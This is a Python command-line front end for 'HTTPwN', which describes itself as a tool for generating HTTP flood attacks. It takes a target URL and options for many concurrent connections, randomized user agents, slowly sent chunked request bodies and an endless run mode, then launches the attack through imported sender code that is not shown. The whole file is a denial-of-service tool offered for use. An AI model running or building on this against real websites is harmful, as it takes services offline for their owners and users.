#!/usr/bin/python3
import argparse

from rqgen import *
from logger import *
from sender import *

parser = argparse.ArgumentParser(prog='HTTPwN', description='Tool for generating HTTP flood attack')
parser.add_argument('url', help='target URL (must contain scheme) e.g. http://targetsite.com:1234')
parser.add_argument('-c',  '--connections', type=int, default=100, help='number of connections to target site')
parser.add_argument('-m',  '--method',      default='GET', help='method of request')
parser.add_argument('-s',  '--spoof-user-agent', action='store_true', help='Each request will have randomized \'User Agent\' header')
parser.add_argument('-bs', '--body-size',   type=int, default=500,  help='Size of payload [bytes] to be send in request body')
parser.add_argument('-nt', '--no-test',     action='store_true', help='don\'t test connection before start')
parser.add_argument('-cs', '--chunk-size',  type=int, default=8, help='size [# of chars] of one chunk of chunked request, set 0 for no chunking (just http flood!)')
parser.add_argument('-cd', '--chunk-delay', type=int, default=500, help='time in [ms] between send of individual request chunks')
parser.add_argument('-i',  '--infinite',    action='store_true', help='run indefinitely :-)')
parser.add_argument('-v', '--verbose',      action='store_true', help='print info messages')
parser.add_argument('-d', '--debug',        action='store_true', help='highly verbose debug mode')

opts = parser.parse_args()

Logger.verbose = opts.verbose
Logger.debugmode = opts.debug

valid_methods = [
    'HEAD',
    'GET',
    'PUT',
    'POST',
    'DELETE',
    'TRACE',
    'OPTIONS',
    'CONNECT'
]

if opts.method.upper() not in valid_methods:
    Logger.error('Method specified is not valid HTTP method')
    exit(1)

Logger.info('Starting HTTPwN')



options = {
    'url': opts.url,
    'chunk_size': opts.chunk_size,
    'chunk_delay': opts.chunk_delay,
    'omit_test': opts.no_test,
    'concurrent_connections': opts.connections,
    'method': opts.method,
    'verbose': opts.verbose,
    'debug': opts.debug,
    'infinite': opts.infinite,
    'spoof-user-agent': opts.spoof_user_agent,
    'bodylen': opts.body_size
}

sender = Sender(options)
if not options['omit_test']:
    if not sender.test_conn():
        exit(1)

sender.attack()

exit(0)
